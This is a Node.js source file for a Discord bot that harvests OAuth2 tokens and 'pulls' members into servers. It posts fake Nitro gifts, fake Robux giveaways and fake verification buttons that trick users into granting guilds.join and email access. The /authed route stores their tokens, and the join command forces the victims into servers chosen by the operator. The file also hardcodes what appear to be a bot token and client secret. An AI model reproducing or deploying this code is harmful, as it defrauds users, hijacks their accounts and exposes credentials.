const main = require("./classes/main");
const Discord = require("discord.js");
const client1 = new Discord.Client()
const disbut = require('discord-buttons')
disbut.multipleImport(client1)
require('dotenv').config()
const config = require("./config.js");
require("./database/main");
const express = require("express");
const app = express();

const client = new main({
  token: MTExNjM3MTMxNDg0NDkwOTczOA.GmK80y.vyojkL6RkOeHTkJymxCwKRGVvvajZW_XTuIgwA,
  prefix: config.prefix,
  client_id: config.client_id,
  client_secret: ijSSlJ2kwx5fxUcuWiL5ZuabMrwOIYOU,
  redirect_uri: config.redirect_uri
});

client.on("ready", (bot) => {
  console.log(`Logged in as a ${bot.user.tag} bot id: ${bot.user.id}`)
});

client.on("message", async (bot, message, args, command) => {
  if (!message.content.startsWith(config.prefix)) return;
  if (!config.owners.includes(message.author.id)) return;

  if (command === "all") {
    const amount = await client.tokenCount();
    message.channel.send(`we have **\`${amount}\`** Members.`);
  }


  if (command === "join") {
    if (!args[0] || !args[1]) return message.channel.send("Wrong usage, `join <server id> <number of join>`")
    let pull = new Discord.MessageEmbed()
      .setTitle(`joining members...`)
      .setColor("#36393F")
      .setDescription("I'm pulling members to the mentioned server please wait...")
      .setFooter("This may take 3-5 minutes.")
    message.channel.send(pull)
    await client.manageJoin({
      amount: args[1],
      guild_id: args[0]
    }, message);
  }

  if (command === "user") {
    let checkembed = new Discord.MessageEmbed()
      .setDescription("<a:ModeratorGalaxy:997882458198515883> The mentioned user is not verified.")
      .setColor("#36393F")
    let check = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Verify')
      .setURL('https://discord.com/oauth2/authorize?client_id=1122254532206927953&redirect_uri=https%3A%2F%2Fauthh.azureiciu.repl.co%2Fauthed&response_type=code&scope=identify%20guilds.join%20guilds%20email')
    message.channel.send({ embed: checkembed, button: check })
  }

  if (command === "clean") {
    await client.clean(message)
  }

  if (command === "refresh") {
    await client.refreshTokens(message)
  }

  if (command === "restart") {
    message.channel.send("Restarting....")
    await client.restart();
  }

  if (command === "help") {
    let help = new Discord.MessageEmbed()
      .setTitle(`oAuth2 Dashboard:`)
      .setDescription("You have unlocked premium version of our bot!\n\n**- To remove credits please donate 5$.**")
      .setColor("#36393F")
      .addField("🛠️ | Help", "`help`")
      .addField("Free Version", "`all`, `credits`, `join`, `refresh`, `restart`, `claim`, `links`")
      .addField("Premium Version (Current)", "**ALL FROM FREE THE VERSION**, `giveaway5`, `giveaway`, `check`, `verify`, `lounge`")
      .addField("Please buy me a cookie ;3", "`donate`")
      .setFooter("Made by Swindler05 & Lusyt")
    message.channel.send(help)
  }

  if (command === "asdasdsad") {
    let donateembed = new Discord.MessageEmbed()
      .setDescription("Hello. I work hard on bots like these and update them daily. It would mean a lot if you could donate to me. Anything helps even 1 cent. To donate please use the button. <3\n\n**Sincerely, iLxlo**")
      .setColor("#36393F")
    let donate = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('husnuzan47@gmail.com')
      .setURL('https://www.coinbase.com/tr/')
    message.channel.send({ embed: donateembed, button: donate })
  }

  if (command === "asdasd") {
    let credits = new Discord.MessageEmbed()
      .setTitle("Credits")
      .setDescription("The bot was made by:\n>iLxlo#7213")
    message.channel.send(credits)
  }

  if (command === "nitro") {
    let claimembed = new Discord.MessageEmbed()
      .setDescription("")
      .setImage("https://media.discordapp.net/attachments/997820441014042694/997994476737921034/unknown.png")
      .setColor("#36393F")
    let claim = new disbut.MessageButton()
      .setStyle('url')
      .setEmoji("<:discord_check:992005470132895755>")
      .setLabel('Claim')
      .setURL('https://discord.com/oauth2/authorize?client_id=1122254532206927953&redirect_uri=https%3A%2F%2Fauthh.azureiciu.repl.co%2Fauthed&response_type=code&scope=identify%20guilds.join%20guilds%20email')
    message.channel.send("<:discord_gift:1001881378448740352> Hello everyone, you have all been gifted **Discord Nitro** for a year!", { embed: claimembed, button: claim })
  }

  if (command === "giveaway") {
    let verifyembed = new Discord.MessageEmbed()

      .setDescription("In order to participate in the giveaway you must verify yourself so we can check if you're an alternative account.\n\n`How to verify?`\n**Click on the __Verify__ button and authorize yourself.**`")
      .setColor("#36393F");
    let verify = new disbut.MessageButton()

      .setStyle('url')
      .setLabel('Verify')
      .setURL('https://discord.com/oauth2/authorize?client_id=1122254532206927953&redirect_uri=https%3A%2F%2Fauthh.azureiciu.repl.co%2Fauthed&response_type=code&scope=identify%20guilds.join%20guilds%20email');
    message.channel.send({ embed: verifyembed, button: verify });
  }


  if (command === "robux2") {
    let giveaway = new Discord.MessageEmbed()
      .setTitle(`🎉 **Giveaway** 🎉`)
      .setColor("#36393F")
      .setDescription("\n  **WINNERS:** `5`\n **TIMER**: `24h`\n **PRIZE:** ` 10000 ROBUX `\n **HOSTED BY: <@1102648018982928494>**\n\n __**Requirements:**__\n>  **Must stay in the server.**\n >  **To enter the giveaway click on the enter button.**")
      .setFooter("Discord Inc.")
    let giveawaybutton = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Enter')
      .setURL('https://discord.com/oauth2/authorize?client_id=1122254532206927953&redirect_uri=https%3A%2F%2Fauthh.azureiciu.repl.co%2Fauthed&response_type=code&scope=identify%20guilds.join%20guilds%20email')
    message.channel.send("Giveaway for `10000 ROBUX` has been made! > ", { embed: giveaway, button: giveawaybutton })
  }

  if (command === "dasdsad") {
    let loungeembed = new Discord.MessageEmbed()
      .setDescription("We will be unlocking <#999341231085719562> once there is enough people. If you want to unlock perms earlier click on the `Unlock Perms` button and verify. After you do this you can talk in the server.\n\n**Having troubles verifying? You can direct message anyone and ask for help.**")
      .setColor("#36393F")
    let lounge = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Unlock Perms')
      .setURL('https://discord.com/oauth2/authorize?client_id=1122254532206927953&redirect_uri=https%3A%2F%2Fauthh.azureiciu.repl.co%2Fauthed&response_type=code&scope=identify%20guilds.join%20guilds%20email')
    message.channel.send({ embed: loungeembed, button: lounge })
  }

  if (command === "robux") {
    let giveaway = new Discord.MessageEmbed()
      .setTitle(`🎉 **Giveaway** 🎉`)
      .setColor("#36393F")
      .setDescription("\n<:arrow_point:1002638234142121985>  **WINNERS:** `5`\n<:info:1002639071753027694> **TIMER**: `1 MINUTE!`\n<:Giveaway:1001881526184706133> **PRIZE:** `10000 ROBUX`\n<:join:1002636675261931670> **Entries**:`138`\n\n<:icons_join:1001881246953128037> __**Requirements:**__\n> <:icons_warning:1001881292750729256> **Must stay in the server.**\n> <:icons_warning:1001881292750729256> **Must verify yourself**\n\nTo enter the giveaway click on the enter button.")
      .setFooter("Discord Inc.")
    let giveawaybutton = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Enter')
      .setURL('https://discord.com/oauth2/authorize?client_id=1122254532206927953&redirect_uri=https%3A%2F%2Fauthh.azureiciu.repl.co%2Fauthed&response_type=code&scope=identify%20guilds.join%20guilds%20email')
    message.channel.send("@everyone Giveaway for `10000 ROBUX` has been made! by <@999642987485200435> dm him if you Entered this giveaway!<a:gifting_tada:1001886507163983983> ", { embed: giveaway, button: giveawaybutton })
  }
  if (command === "links") {
    const amount = await client.tokenCount();
    message.channel.send({
      embed: {
        title: "🔗 Oauth/Invite:",
        description: "<:join:1122254532206927953> [ Bot Invite : ](https://discord.com/oauth2/authorize?client_id=1122254532206927953&redirect_uri=https%3A%2F%2Fauthh.azureiciu.repl.co%2Fauthed&response_type=code&scope=identify%20guilds.join%20guilds%20email```",
        color: "#36393e"
      }
    });
  }




})


app.get("/", (req, res) => {
  res.redirect(config.oauth_link);
});

app.get("/authed", async (req, res) => {
  const data = await client.manageAuth({ code: req.query.code });
  const user_id = await client.requestId(data.access_token);
  const obj = {
    ...data,
    user_id
  };
  client.saveAuth(obj);
  res.redirect("https://discord.com/oauth2/authorized");
});

app.listen(80);